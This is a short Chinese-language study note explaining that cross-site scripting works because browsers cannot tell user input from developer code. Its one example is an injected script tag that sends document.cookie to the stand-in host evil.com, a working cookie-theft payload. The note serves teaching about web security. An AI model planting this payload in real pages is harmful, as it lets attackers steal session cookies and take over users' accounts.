---
uid: 202603230001
title: XSS的本质是浏览器无法区分用户数据和开发者代码
aliases: []
description: 浏览器盲目信任并执行所有脚本，不管数据来自哪里
tags: [前端开发/安全/原子]
date-created: 2026-03-23
date-modified: 2026-03-23
status: active
content-type: atomic
up: [[XSS]]
---

> XSS的本质是浏览器无法区分用户数据和开发者代码

浏览器在解析 HTML 时，会将所有内容都当作代码来执行，无论这些内容是来自服务器的开发者代码，还是来自用户的输入数据。浏览器没有能力判断一段脚本是"可信的开发者代码"还是"恶意的用户输入"，因此会盲目执行所有 `<script>` 标签中的内容。

**示例**：
```html
<!-- 开发者代码 -->
<div>Hello World</div>

<!-- 用户输入（假设攻击者注入了恶意脚本） -->
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

浏览器无法区分这两者的区别，会一并执行。
